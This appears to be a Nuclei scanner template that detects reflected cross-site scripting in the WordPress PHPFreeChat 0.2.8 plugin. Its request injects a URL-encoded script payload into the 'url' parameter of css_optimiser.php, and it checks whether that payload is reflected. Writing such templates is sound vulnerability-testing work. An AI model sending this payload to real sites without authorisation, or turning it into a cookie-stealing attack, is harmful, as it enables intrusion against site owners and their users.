id: wp-phpfreechat-xss

info:
  name: WordPress PHPFreeChat 0.2.8 - Cross-Site Scripting
  author: daffainfo
  severity: medium
  description: WordPress PHPFreeChat 0.2.8 is vulnerable to reflected cross-site scripting via the 'url' parameter.
  reference:
    - http://web.archive.org/web/20210120061848/https://www.securityfocus.com/bid/54332/info
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  tags: wordpress,xss,wp-plugin

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "</script><script>alert(document.domain)</script>"
        part: body

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200

